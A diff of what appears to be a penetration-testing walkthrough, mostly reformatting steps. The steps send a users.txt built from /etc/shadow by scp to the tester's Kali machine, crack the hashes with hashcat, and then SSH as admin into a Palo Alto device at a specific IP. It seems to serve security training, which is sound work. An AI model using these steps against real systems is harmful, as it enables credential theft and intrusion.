@@ -280,13 +280,17 @@ NOTE: The `>>` operator ensures that the contents of `/etc/shadow` and `/etc/hos
 
 2. Next, use `SCP` to securely copy the `users.txt` file to your attack machine:
 
-   On your Kali machine, run the command `systemctl status ssh`.
-   If disabled and inactive, run the following two commands:
-   `sudo systemctl enable ssh`
-   `sudo systemctl start ssh`
+   - On your Kali machine, run the command `systemctl status ssh`.
+   - If disabled and inactive, run the following two commands:
+
+```bash
+sudo systemctl enable ssh
+sudo systemctl start ssh
+```
+
    To confirm the service has started, run
    `systemctl status ssh`
-   
+
 ```bash
 scp users.txt kali@<your_ip_address>:.
 ```
@@ -316,7 +320,8 @@ In this section, we will leverage the exfiltrated users.txt file that was pulled
 ```bash
 hashcat -m 7400 -a 0 valid_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
-   This will use Hashcat to attempt cracking the passwords. The -m 7400 option specifies the SHA-256 crypt format, and the -a 0 option sets the attack mode to dictionary-based.
+
+This will use Hashcat to attempt cracking the passwords. The -m 7400 option specifies the SHA-256 crypt format, and the -a 0 option sets the attack mode to dictionary-based.
    -While Hashcat is running, you can check the status of the cracking process by using the following command: `hashcat --status`
 6. Once Hashcat has completed the cracking process, you can view the cracked passwords by running: `hashcat --show valid_hashes.txt`
 7. Using the cracked administrator credentials, you can now log into the Palo Alto device via SSH: `ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa admin@1.33.170.38`
@@ -336,8 +341,6 @@ Additionally, we copy all outputs from coommands into a text document on our loc
 3. Check arp table: `show arp all`
 4. Check active sessions: `show session all`
 5. Show system resources: `show system resources`
-
-
 
 #### Look for management configs or logs
 
